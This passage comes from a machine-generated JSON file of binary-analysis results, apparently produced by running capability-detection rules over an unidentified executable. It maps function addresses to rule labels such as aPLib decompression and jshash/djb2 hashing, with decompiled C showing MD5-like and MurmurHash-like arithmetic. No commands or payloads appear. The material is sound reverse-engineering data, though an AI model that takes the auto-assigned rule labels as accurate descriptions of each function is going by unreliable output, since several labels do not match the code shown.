        "decompiled_code": "\nuint32_t __cdecl fcn.00413aab(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    int32_t unaff_EDI;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((in_EAX == 0) || (arg_ch == 0)) {\n        var_4h = 0;\n    }\n    else {\n        uVar1 = 0x80000000;\n        var_8h = 0;\n        do {\n            if ((arg_ch & uVar1) != 0) break;\n            uVar1 = uVar1 >> 1;\n            var_8h = var_8h + 1;\n        } while (var_8h < 0x20);\n        var_4h = fcn.0041382f(unaff_EDI, arg_8h, var_8h, in_EAX);\n        arg_8h_00 = unaff_EDI + in_EAX * 4;\n        do {\n            arg_8h_00 = arg_8h_00 + -4;\n            fcn.00412b1e(arg_8h_00, &var_4h, arg_ch << (var_8h & 0x1f));\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n        var_4h = var_4h >> (var_8h & 0x1f);\n    }\n    return var_4h;\n}\n",
        "token_count": 371
    },
    "0040d9de": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t fcn.0040d9de(void)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t unaff_EDI;\n    \n    cVar2 = fcn.0040f84a();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    uVar5 = 0;\n    puVar1 = in_EAX + (unaff_EDI & 0xfffffffc);\n    for (iVar3 = -(unaff_EDI >> 2); iVar3 != 0; iVar3 = iVar3 + 1) {\n        uVar5 = uVar5 ^ (*(puVar1 + iVar3 * 4) * 0x16a88000 | *(puVar1 + iVar3 * 4) * -0x3361d2af >> 0x11) * 0x1b873593;\n        uVar5 = (uVar5 << 0xd | uVar5 >> 0x13) * 5 + 0xe6546b64;\n    }\n    uVar4 = unaff_EDI & 3;\n    uVar6 = 0;\n    if (uVar4 != 1) {\n        if (uVar4 != 2) {\n            if (uVar4 != 3) goto code_r0x0040da59;\n            uVar6 = puVar1[2] << 0x10;\n        }\n        uVar6 = uVar6 ^ puVar1[1] << 8;\n    }\n    uVar5 = uVar5 ^ ((*puVar1 ^ uVar6) * 0x16a88000 | (*puVar1 ^ uVar6) * -0x3361d2af >> 0x11) * 0x1b873593;\ncode_r0x0040da59:\n    uVar5 = ((uVar5 ^ unaff_EDI) >> 0x10 ^ uVar5 ^ unaff_EDI) * -0x7a143595;\n    uVar5 = (uVar5 >> 0xd ^ uVar5) * -0x3d4d51cb;\n    return uVar5 >> 0x10 ^ uVar5;\n}\n",
        "token_count": 527
    },
    "0040e78c": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e78c(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    ushort *puVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = in_ECX + 2;\n    puVar4 = &var_48h;\n    iVar6 = 0x10;\n    do {\n        *puVar4 = CONCAT31(CONCAT21(*puVar2, *(puVar2 + -1)), *(puVar2 + -1));\n        puVar4 = puVar4 + 1;\n        puVar2 = puVar2 + 2;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar7 = arg_8h[1];\n    uVar5 = arg_8h[2];\n    uVar3 = (~uVar7 & arg_8h[3] | uVar5 & uVar7) + var_48h + -0x28955b88 + *arg_8h;\n    uVar1 = (uVar3 * 0x80 | uVar3 >> 0x19) + uVar7;\n    uVar3 = (~uVar1 & uVar5 | uVar7 & uVar1) + var_44h + -0x173848aa + arg_8h[3];\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n    uVar5 = (~uVar3 & uVar7 | uVar3 & uVar1) + var_40h + 0x242070db + uVar5;\n    uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar3;\n    uVar7 = (~uVar5 & uVar1 | uVar3 & uVar5) + var_3ch + -0x3e423112 + uVar7;\n    uVar7 = (uVar7 >> 10 | uVar7 * 0x400000) + uVar5;\n    uVar1 = (~uVar7 & uVar3 | uVar5 & uVar7) + var_38h + -0xa83f051 + uVar1;\n    uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar7;\n    uVar3 = (~uVar1 & uVar5 | uVar7 & uVar1) + var_34h + 0x4787c62a + uVar3;\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n    uVar5 = (~uVar3 & uVar7 | uVar3 & uVar1) + var_30h + -0x57cfb9ed + uVar5;\n    uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar3;\n    uVar7 = (~uVar5 & uVar1 | uVar3 & uVar5) + var_2ch + -0x2b96aff + uVar7;\n    uVar7 = (uVar7 >> 10 | uVar7 * 0x400000) + uVar5;\n    uVar1 = (~uVar7 & uVar3 | uVar5 & uVar7) + var_28h + 0x698098d8 + uVar1;\n    uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar7;\n    uVar3 = (~uVar1 & uVar5 | uVar7 & uVar1) + var_24h + -0x74bb0851 + uVar3;\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n    uVar5 = (~uVar3 & uVar7 | uVar3 & uVar1) + var_20h + -0xa44f + uVar5;\n    uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar3;\n    uVar7 = (~uVar5 & uVar1 | uVar3 & uVar5) + var_1ch + -0x76a32842 + uVar7;\n    uVar7 = (uVar7 >> 10 | uVar7 * 0x400000) + uVar5;\n    uVar1 = (~uVar7 & uVar3 | uVar5 & uVar7) + var_18h + 0x6b901122 + uVar1;\n    uVar1 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar7;\n    uVar3 = (~uVar1 & uVar5 | uVar7 & uVar1) + var_14h + -0x2678e6d + uVar3;\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar1;\n    uVar5 = (~uVar3 & uVar7 | uVar3 & uVar1) + var_10h + -0x5986bc72 + uVar5;\n    uVar5 = (uVar5 >> 0xf | uVar5 * 0x20000) + uVar3;\n    uVar7 = (~uVar5 & uVar1 | uVar3 & uVar5) + var_ch + 0x49b40821 + uVar7;\n    uVar7 = (uVar7 >> 10 | uVar7 * 0x400000) + uVar5;\n    uVar1 = (~uVar3 & uVar5 | uVar3 & uVar7) + var_44h + -0x9e1da9e + uVar1;\n    uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar7;\n    uVar3 = (~uVar5 & uVar7 | uVar5 & uVar1) + var_30h + -0x3fbf4cc0 + uVar3;\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar1;\n    uVar5 = (~uVar7 & uVar1 | uVar3 & uVar7) + var_1ch + 0x265e5a51 + uVar5;\n    uVar5 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar3;\n    uVar7 = (~uVar1 & uVar3 | uVar5 & uVar1) + var_48h + -0x16493856 + uVar7;\n    uVar7 = (uVar7 >> 0xc | uVar7 * 0x100000) + uVar5;\n    uVar1 = (~uVar3 & uVar5 | uVar3 & uVar7) + var_34h + -0x29d0efa3 + uVar1;\n    uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar7;\n    uVar3 = (~uVar5 & uVar7 | uVar5 & uVar1) + var_20h + 0x2441453 + uVar3;\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar1;\n    uVar5 = (~uVar7 & uVar1 | uVar3 & uVar7) + var_ch + -0x275e197f + uVar5;\n    uVar5 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar3;\n    uVar7 = (~uVar1 & uVar3 | uVar5 & uVar1) + var_38h + -0x182c0438 + uVar7;\n    uVar7 = (uVar7 >> 0xc | uVar7 * 0x100000) + uVar5;\n    uVar1 = (~uVar3 & uVar5 | uVar3 & uVar7) + var_24h + 0x21e1cde6 + uVar1;\n    uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar7;\n    uVar3 = (~uVar5 & uVar7 | uVar5 & uVar1) + var_10h + -0x3cc8f82a + uVar3;\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar1;\n    uVar5 = (~uVar7 & uVar1 | uVar3 & uVar7) + var_3ch + -0xb2af279 + uVar5;\n    uVar5 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar3;\n    uVar7 = (~uVar1 & uVar3 | uVar5 & uVar1) + var_28h + 0x455a14ed + uVar7;\n    uVar7 = (uVar7 >> 0xc | uVar7 * 0x100000) + uVar5;\n    uVar1 = (~uVar3 & uVar5 | uVar3 & uVar7) + var_14h + -0x561c16fb + uVar1;\n    uVar1 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar7;\n    uVar3 = (~uVar5 & uVar7 | uVar5 & uVar1) + var_40h + -0x3105c08 + uVar3;\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar1;\n    uVar5 = (~uVar7 & uVar1 | uVar3 & uVar7) + var_2ch + 0x676f02d9 + uVar5;\n    uVar5 = (uVar5 * 0x4000 | uVar5 >> 0x12) + uVar3;\n    uVar7 = (~uVar1 & uVar3 | uVar5 & uVar1) + var_18h + -0x72d5b376 + uVar7;\n    uVar7 = (uVar7 >> 0xc | uVar7 * 0x100000) + uVar5;\n    uVar1 = (uVar3 ^ uVar5 ^ uVar7) + var_34h + -0x5c6be + uVar1;\n    uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar7;\n    uVar3 = (uVar5 ^ uVar7 ^ uVar1) + var_28h + -0x788e097f + uVar3;\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar1;\n    uVar5 = (uVar3 ^ uVar7 ^ uVar1) + var_1ch + 0x6d9d6122 + uVar5;\n    uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar3;\n    uVar7 = (uVar3 ^ uVar5 ^ uVar1) + var_10h + -0x21ac7f4 + uVar7;\n    uVar7 = (uVar7 >> 9 | uVar7 * 0x800000) + uVar5;\n    uVar1 = (uVar3 ^ uVar5 ^ uVar7) + var_44h + -0x5b4115bc + uVar1;\n    uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar7;\n    uVar3 = (uVar5 ^ uVar7 ^ uVar1) + var_38h + 0x4bdecfa9 + uVar3;\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar1;\n    uVar5 = (uVar3 ^ uVar7 ^ uVar1) + var_2ch + -0x944b4a0 + uVar5;\n    uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar3;\n    uVar7 = (uVar3 ^ uVar5 ^ uVar1) + var_20h + -0x41404390 + uVar7;\n    uVar7 = (uVar7 >> 9 | uVar7 * 0x800000) + uVar5;\n    uVar1 = (uVar3 ^ uVar5 ^ uVar7) + var_14h + 0x289b7ec6 + uVar1;\n    uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar7;\n    uVar3 = (uVar5 ^ uVar7 ^ uVar1) + var_48h + -0x155ed806 + uVar3;\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar1;\n    uVar5 = (uVar3 ^ uVar7 ^ uVar1) + var_3ch + -0x2b10cf7b + uVar5;\n    uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar3;\n    uVar7 = (uVar3 ^ uVar5 ^ uVar1) + var_30h + 0x4881d05 + uVar7;\n    uVar7 = (uVar7 >> 9 | uVar7 * 0x800000) + uVar5;\n    uVar1 = (uVar3 ^ uVar5 ^ uVar7) + var_24h + -0x262b2fc7 + uVar1;\n    uVar1 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar7;\n    uVar3 = (uVar5 ^ uVar7 ^ uVar1) + var_18h + -0x1924661b + uVar3;\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar1;\n    uVar5 = (uVar3 ^ uVar7 ^ uVar1) + var_ch + 0x1fa27cf8 + uVar5;\n    uVar5 = (uVar5 * 0x10000 | uVar5 >> 0x10) + uVar3;\n    uVar7 = (uVar3 ^ uVar5 ^ uVar1) + var_40h + -0x3b53a99b + uVar7;\n    uVar7 = (uVar7 >> 9 | uVar7 * 0x800000) + uVar5;\n    uVar1 = ((~uVar3 | uVar7) ^ uVar5) + var_48h + -0xbd6ddbc + uVar1;\n    uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar7;\n    uVar3 = ((~uVar5 | uVar1) ^ uVar7) + var_2ch + 0x432aff97 + uVar3;\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar1;\n    uVar5 = ((~uVar7 | uVar3) ^ uVar1) + var_10h + -0x546bdc59 + uVar5;\n    uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar3;\n    uVar7 = ((~uVar1 | uVar5) ^ uVar3) + var_34h + -0x36c5fc7 + uVar7;\n    uVar7 = (uVar7 >> 0xb | uVar7 * 0x200000) + uVar5;\n    uVar1 = ((~uVar3 | uVar7) ^ uVar5) + var_18h + 0x655b59c3 + uVar1;\n    uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar7;\n    uVar3 = ((~uVar5 | uVar1) ^ uVar7) + var_3ch + -0x70f3336e + uVar3;\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar1;\n    uVar5 = ((~uVar7 | uVar3) ^ uVar1) + var_20h + -0x100b83 + uVar5;\n    uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar3;\n    uVar7 = ((~uVar1 | uVar5) ^ uVar3) + var_44h + -0x7a7ba22f + uVar7;\n    uVar7 = (uVar7 >> 0xb | uVar7 * 0x200000) + uVar5;\n    uVar1 = ((~uVar3 | uVar7) ^ uVar5) + var_28h + 0x6fa87e4f + uVar1;\n    uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar7;\n    uVar3 = ((~uVar5 | uVar1) ^ uVar7) + var_ch + -0x1d31920 + uVar3;\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar1;\n    uVar5 = ((~uVar7 | uVar3) ^ uVar1) + var_30h + -0x5cfebcec + uVar5;\n    uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar3;\n    uVar7 = ((~uVar1 | uVar5) ^ uVar3) + var_14h + 0x4e0811a1 + uVar7;\n    uVar7 = (uVar7 >> 0xb | uVar7 * 0x200000) + uVar5;\n    uVar1 = ((~uVar3 | uVar7) ^ uVar5) + var_38h + -0x8ac817e + uVar1;\n    uVar1 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar7;\n    uVar3 = ((~uVar5 | uVar1) ^ uVar7) + var_1ch + -0x42c50dcb + uVar3;\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar1;\n    uVar5 = ((~uVar7 | uVar3) ^ uVar1) + var_40h + 0x2ad7d2bb + uVar5;\n    uVar5 = (uVar5 * 0x8000 | uVar5 >> 0x11) + uVar3;\n    *arg_8h = *arg_8h + uVar1;\n    uVar7 = ((~uVar1 | uVar5) ^ uVar3) + var_24h + -0x14792c6f + uVar7;\n    arg_8h[1] = (uVar7 >> 0xb | uVar7 * 0x200000) + arg_8h[1] + uVar5;\n    arg_8h[2] = arg_8h[2] + uVar5;\n    arg_8h[3] = arg_8h[3] + uVar3;\n    return;\n}\n",
        "token_count": 4819
    },
    "0041486c": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041486c(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0x89abcdef;\n    var_ch = 0x1234567;\n    if (0 < param_1 * 0x10) {\n        var_8h = (param_1 * 0x10 - 1U >> 4) + 1;\n        puVar2 = in_EAX + 0x1d0;\n        do {\n            uVar4 = puVar2[-0x47] & puVar2[1] ^ puVar2[0x1b] & puVar2[0x15] ^ puVar2[-0x73] ^ puVar2[0x1d] ^ var_ch;\n            uVar3 = puVar2[-0x48] & *puVar2 ^ puVar2[0x1a] & puVar2[0x14] ^ puVar2[-0x74] ^ puVar2[0x1c] ^ var_10h;\n            uVar3 = uVar3 ^ (uVar3 >> 10 | uVar4 << 0x16);\n            uVar4 = uVar4 ^ uVar4 >> 10;\n            puVar2[0x3f] = (uVar4 << 0xb | uVar3 >> 0x15) ^ uVar4;\n            uVar4 = puVar2[-0x46] & puVar2[2] ^ puVar2[0x1c] & puVar2[0x16] ^ puVar2[-0x72] ^ puVar2[0x1e] ^ var_10h;\n            uVar5 = puVar2[-0x45] & puVar2[3] ^ puVar2[0x1d] & puVar2[0x17] ^ puVar2[-0x71] ^ puVar2[0x1f] ^ var_ch;\n            puVar2[0x3e] = uVar3 << 0xb ^ uVar3;\n            uVar4 = uVar4 ^ (uVar4 >> 5 | uVar5 << 0x1b);\n            uVar5 = uVar5 ^ uVar5 >> 5;\n            puVar1 = puVar2 + 0x20;\n            puVar2[0x40] = uVar4 << 0x18 ^ uVar4;\n            puVar2[0x41] = (uVar5 << 0x18 | uVar4 >> 8) ^ uVar5;\n            uVar3 = puVar2[0x21];\n            uVar4 = puVar2[-0x44] & puVar2[4] ^ puVar2[0x18] & puVar2[0x1e] ^ puVar2[-0x70] ^ *puVar1 ^ var_10h;\n            uVar6 = puVar2[-0x43] & puVar2[5] ^ puVar2[0x19] & puVar2[0x1f] ^ puVar2[-0x6f] ^ uVar3 ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xd | uVar6 << 0x13);\n            uVar6 = uVar6 ^ uVar6 >> 0xd;\n            puVar2[0x42] = uVar4 << 9 ^ uVar4;\n            uVar5 = puVar2[-0x42] & puVar2[6] ^ puVar2[0x1a] & *puVar1 ^ puVar2[-0x6e] ^ puVar2[0x22] ^ var_10h;\n            uVar7 = puVar2[-0x41] & puVar2[7] ^ puVar2[0x1b] & uVar3 ^ puVar2[-0x6d] ^ puVar2[0x23] ^ var_ch;\n            puVar2[0x43] = (uVar6 << 9 | uVar4 >> 0x17) ^ uVar6;\n            uVar5 = uVar5 ^ (uVar5 >> 10 | uVar7 << 0x16);\n            uVar7 = uVar7 ^ uVar7 >> 10;\n            puVar2[0x44] = uVar5 << 0x10 ^ uVar5;\n            uVar4 = puVar2[-0x40] & puVar2[8] ^ puVar2[0x1c] & puVar2[0x22] ^ puVar2[-0x6c] ^ puVar2[0x24] ^ var_10h;\n            uVar6 = puVar2[-0x3f] & puVar2[9] ^ puVar2[0x1d] & puVar2[0x23] ^ puVar2[-0x6b] ^ puVar2[0x25] ^ var_ch;\n            puVar2[0x45] = (uVar7 << 0x10 | uVar5 >> 0x10) ^ uVar7;\n            uVar4 = uVar4 ^ (uVar4 >> 0xb | uVar6 << 0x15);\n            uVar6 = uVar6 ^ uVar6 >> 0xb;\n            puVar2[0x46] = uVar4 << 0xf ^ uVar4;\n            puVar2[0x47] = (uVar6 << 0xf | uVar4 >> 0x11) ^ uVar6;\n            uVar4 = puVar2[0x26];\n            uVar6 = puVar2[-0x3d] & puVar2[0xb] ^ puVar2[0x25] & puVar2[0x1f] ^ puVar2[-0x69] ^ puVar2[0x27] ^ var_ch;\n            uVar5 = puVar2[-0x3e] & puVar2[10] ^ puVar2[0x24] & puVar2[0x1e] ^ puVar2[-0x6a] ^ uVar4 ^ var_10h;\n            uVar5 = uVar5 ^ (uVar5 >> 0xc | uVar6 << 0x14);\n            uVar6 = uVar6 ^ uVar6 >> 0xc;\n            puVar2[0x49] = (uVar6 << 9 | uVar5 >> 0x17) ^ uVar6;\n            puVar2[0x48] = uVar5 << 9 ^ uVar5;\n            uVar5 = puVar2[-0x3c] & puVar2[0xc] ^ uVar4 & *puVar1 ^ puVar2[-0x68] ^ puVar2[0x28] ^ var_10h;\n            uVar3 = puVar2[-0x3b] & puVar2[0xd] ^ puVar2[0x27] & uVar3 ^ puVar2[-0x67] ^ puVar2[0x29] ^ var_ch;\n            uVar5 = uVar5 ^ (uVar5 >> 2 | uVar3 << 0x1e);\n            uVar3 = uVar3 ^ uVar3 >> 2;\n            puVar2[0x4a] = uVar5 << 0x1b ^ uVar5;\n            puVar2[0x4b] = (uVar3 << 0x1b | uVar5 >> 5) ^ uVar3;\n            uVar6 = puVar2[-0x3a] & puVar2[0xe] ^ puVar2[0x28] & puVar2[0x22] ^ puVar2[-0x66] ^ puVar2[0x2a] ^ var_10h;\n            uVar7 = puVar2[-0x39] & puVar2[0xf] ^ puVar2[0x29] & puVar2[0x23] ^ puVar2[-0x65] ^ puVar2[0x2b] ^ var_ch;\n            uVar6 = uVar6 ^ (uVar6 >> 7 | uVar7 << 0x19);\n            uVar7 = uVar7 ^ uVar7 >> 7;\n            uVar3 = puVar2[0x2c];\n            uVar5 = puVar2[0x2d];\n            puVar2[0x4c] = uVar6 << 0xf ^ uVar6;\n            puVar2[0x4d] = (uVar7 << 0xf | uVar6 >> 0x11) ^ uVar7;\n            uVar6 = puVar2[-0x38] & puVar2[0x10] ^ puVar2[0x2a] & puVar2[0x24] ^ puVar2[-100] ^ uVar3 ^ var_10h;\n            uVar7 = puVar2[-0x37] & puVar2[0x11] ^ puVar2[0x2b] & puVar2[0x25] ^ puVar2[-99] ^ uVar5 ^ var_ch;\n            uVar6 = uVar6 ^ (uVar6 >> 0xe | uVar7 << 0x12);\n            uVar7 = uVar7 ^ uVar7 >> 0xe;\n            puVar2[0x4e] = uVar6 << 6 ^ uVar6;\n            uVar4 = puVar2[-0x36] & puVar2[0x12] ^ uVar3 & uVar4 ^ puVar2[-0x62] ^ puVar2[0x2e] ^ var_10h;\n            puVar2[0x4f] = (uVar7 << 6 | uVar6 >> 0x1a) ^ uVar7;\n            uVar6 = puVar2[-0x35] & puVar2[0x13] ^ uVar5 & puVar2[0x27] ^ puVar2[-0x61] ^ puVar2[0x2f] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xf | uVar6 << 0x11);\n            uVar6 = uVar6 ^ uVar6 >> 0xf;\n            puVar2[0x50] = uVar4 << 2 ^ uVar4;\n            puVar2[0x51] = (uVar6 << 2 | uVar4 >> 0x1e) ^ uVar6;\n            uVar4 = puVar2[-0x34] & puVar2[0x14] ^ puVar2[0x2e] & puVar2[0x28] ^ puVar2[-0x60] ^ puVar2[0x30] ^ var_10h;\n            uVar6 = puVar2[-0x33] & puVar2[0x15] ^ puVar2[0x2f] & puVar2[0x29] ^ puVar2[-0x5f] ^ puVar2[0x31] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 7 | uVar6 << 0x19);\n            uVar6 = uVar6 ^ uVar6 >> 7;\n            puVar2[0x52] = uVar4 << 0x1d ^ uVar4;\n            puVar2[0x53] = (uVar6 << 0x1d | uVar4 >> 3) ^ uVar6;\n            uVar4 = puVar2[-0x32] & puVar2[0x16] ^ puVar2[0x30] & puVar2[0x2a] ^ puVar2[-0x5e] ^ puVar2[0x32] ^ var_10h;\n            uVar6 = puVar2[-0x31] & puVar2[0x17] ^ puVar2[0x31] & puVar2[0x2b] ^ puVar2[-0x5d] ^ puVar2[0x33] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xd | uVar6 << 0x13);\n            uVar6 = uVar6 ^ uVar6 >> 0xd;\n            puVar2[0x54] = uVar4 << 8 ^ uVar4;\n            uVar3 = puVar2[-0x30] & puVar2[0x18] ^ uVar3 & puVar2[0x32] ^ puVar2[-0x5c] ^ puVar2[0x34] ^ var_10h;\n            puVar2[0x55] = (uVar6 << 8 | uVar4 >> 0x18) ^ uVar6;\n            uVar4 = puVar2[-0x2f] & puVar2[0x19] ^ uVar5 & puVar2[0x33] ^ puVar2[-0x5b] ^ puVar2[0x35] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 0xb | uVar4 << 0x15);\n            uVar4 = uVar4 ^ uVar4 >> 0xb;\n            puVar2[0x57] = (uVar4 << 0xf | uVar3 >> 0x11) ^ uVar4;\n            puVar2[0x56] = uVar3 << 0xf ^ uVar3;\n            uVar3 = puVar2[-0x2e] & puVar2[0x1a] ^ puVar2[0x34] & puVar2[0x2e] ^ puVar2[-0x5a] ^ puVar2[0x36] ^ var_10h;\n            uVar4 = puVar2[-0x2d] & puVar2[0x1b] ^ puVar2[0x35] & puVar2[0x2f] ^ puVar2[-0x59] ^ puVar2[0x37] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 7 | uVar4 << 0x19);\n            uVar4 = uVar4 ^ uVar4 >> 7;\n            puVar2[0x59] = (uVar4 << 5 | uVar3 >> 0x1b) ^ uVar4;\n            puVar2[0x58] = uVar3 << 5 ^ uVar3;\n            uVar3 = puVar2[-0x2c] & puVar2[0x1c] ^ puVar2[0x36] & puVar2[0x30] ^ puVar2[-0x58] ^ puVar2[0x38] ^ var_10h;\n            uVar4 = puVar2[-0x2b] & puVar2[0x1d] ^ puVar2[0x37] & puVar2[0x31] ^ puVar2[-0x57] ^ puVar2[0x39] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 6 | uVar4 << 0x1a);\n            uVar4 = uVar4 ^ uVar4 >> 6;\n            puVar2[0x5b] = (uVar4 << 0x1f | uVar3 >> 1) ^ uVar4;\n            puVar2[0x5a] = uVar3 << 0x1f ^ uVar3;\n            uVar3 = puVar2[-0x2a] & puVar2[0x1e] ^ puVar2[0x38] & puVar2[0x32] ^ puVar2[-0x56] ^ puVar2[0x3a] ^ var_10h;\n            uVar4 = puVar2[-0x29] & puVar2[0x1f] ^ puVar2[0x39] & puVar2[0x33] ^ puVar2[-0x55] ^ puVar2[0x3b] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 0xc | uVar4 << 0x14);\n            uVar4 = uVar4 ^ uVar4 >> 0xc;\n            puVar2[0x5c] = uVar3 << 9 ^ uVar3;\n            puVar2[0x5d] = (uVar4 << 9 | uVar3 >> 0x17) ^ uVar4;\n            uVar3 = var_10h >> 0x1f;\n            var_10h = var_10h & 0x2425cfa0 ^ var_ch >> 0x1f ^ var_10h * 2;\n            var_ch = var_ch & 0x7311c281 ^ (var_ch << 1 | uVar3);\n            var_8h = var_8h + -1;\n            puVar2 = puVar1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 4032
    },
    "004150a0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004150a0(uint *arg_8h, uint *arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch, \n            uint32_t arg_20h, uint32_t arg_24h, uint32_t arg_28h, uint *arg_2ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    puVar4 = 0x418fa8;\n    puVar5 = arg_8h;\n    for (iVar1 = 0x1e; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    puVar4 = arg_8h + 0x1e;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        puVar4 = puVar4 + 1;\n    }\n    arg_8h[0x2f] = in_EAX << 0x18 | arg_10h >> 0x1f;\n    arg_8h[0x2e] = arg_10h;\n    arg_1ch = (arg_14h << 8 | arg_18h) << 4 | arg_1ch;\n    uVar2 = arg_1ch << 0x10 | arg_20h;\n    uVar3 = uVar2 << 8 | arg_24h;\n    arg_8h[0x31] = ((arg_1ch >> 0x10 | arg_20h >> 0x1f) << 8 | uVar2 >> 0x18 | arg_24h >> 0x1f) << 0xc | uVar3 >> 0x14 |\n                   arg_28h >> 0x1f;\n    arg_8h[0x30] = uVar3 << 0xc | arg_28h;\n    puVar4 = arg_8h + 0x32;\n    for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *arg_2ch;\n        arg_2ch = arg_2ch + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 607
    },
    "004137b1": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
